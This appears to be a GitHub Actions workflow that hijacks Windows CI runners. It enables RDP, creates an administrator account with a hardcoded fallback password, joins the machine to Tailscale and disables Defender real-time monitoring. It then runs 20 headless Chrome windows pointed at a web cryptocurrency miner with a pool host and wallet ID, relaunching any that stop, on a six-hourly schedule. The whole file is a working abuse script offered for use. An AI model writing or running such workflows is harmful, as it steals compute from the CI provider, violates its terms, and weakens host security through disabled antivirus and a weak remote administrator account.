name: RDP Auto-Recreate Miner

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"   # ŸÉŸÑ 6 ÿ≥ÿßÿπÿßÿ™

env:
  RDP_USER: "RDPUser"
  RDP_PASS_FALLBACK: "DefaultPass!234"
  MAX_RUNTIME: 340       # 5 ÿ≥ÿßÿπÿßÿ™ Ÿà 40 ÿØŸÇŸäŸÇÿ©
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=20"

jobs:
  rdp_miner:
    runs-on: windows-latest
    timeout-minutes: 360   # Safety timeout in minutes

    steps:
      - name: Enable RDP
        run: |
          Write-Host "‚úÖ Enabling RDP..."
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          # Performance tweaks
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 2
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160

      - name: Create RDP User
        run: |
          if (-not $env:RDP_PASSWORD -or $env:RDP_PASSWORD -eq "") {
              $password = $env:RDP_PASS_FALLBACK
          } else {
              $password = $env:RDP_PASSWORD
          }

          $secure = ConvertTo-SecureString $password -AsPlainText -Force

          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
              New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
              Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
              Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          } else {
              Set-LocalUser -Name $env:RDP_USER -Password $secure
          }

          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
        env:
          RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"

          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer

      - name: Connect Tailscale
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          if (-not (Test-Path $tsExe)) { Write-Error "Tailscale not found!" ; exit 1 }

          Start-Service Tailscale
          Start-Sleep -Seconds 5

          & $tsExe up --reset --authkey ${{ secrets.TAILSCALE_AUTH_KEY }} --hostname "GH-RDP-${{ github.run_id }}"
          $ip = & $tsExe ip -4
          echo "TS_IP=$ip" >> $env:GITHUB_ENV
          Write-Host "Tailscale IP: $ip"

      - name: Optimize Windows
        run: |
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN
          Set-MpPreference -DisableRealtimeMonitoring $true

      - name: Launch Chrome Miner (Headless, 20 windows)
        run: |
          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
          if (-not (Test-Path $chromePath)) { Write-Error "Chrome not found!"; exit 1 }

          for ($i=1; $i -le 20; $i++) {
              Start-Process $chromePath -ArgumentList "--kiosk $env:MINER_URL --headless --disable-gpu --no-sandbox --disable-dev-shm-usage --window-position=$i,0 --window-size=1920,1080" 
              Start-Sleep -Milliseconds 500
          }

      - name: Keep Miner Alive
        run: |
          $runtime = $env:MAX_RUNTIME
          for ($i=0; $i -lt $runtime; $i+=1) {
              Write-Host "üïê Miner running... minute $i / $runtime"
              Start-Sleep -Seconds 60
              # Optional: check Chrome process and restart any missing window
              $chromeCount = (Get-Process chrome -ErrorAction SilentlyContinue | Measure-Object).Count
              if ($chromeCount -lt 20) {
                  Write-Host "üîÑ Restarting missing Chrome windows..."
                  $missing = 20 - $chromeCount
                  for ($j=1; $j -le $missing; $j++) {
                      Start-Process $chromePath -ArgumentList "--kiosk $env:MINER_URL --headless --disable-gpu --no-sandbox --disable-dev-shm-usage --window-position=$j,0 --window-size=1920,1080"
                  }
              }
          }

      - name: Cleanup
        if: always()
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          if (Test-Path $tsExe) { & $tsExe logout }
          Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
          Write-Host "‚úÖ Cleanup completed"
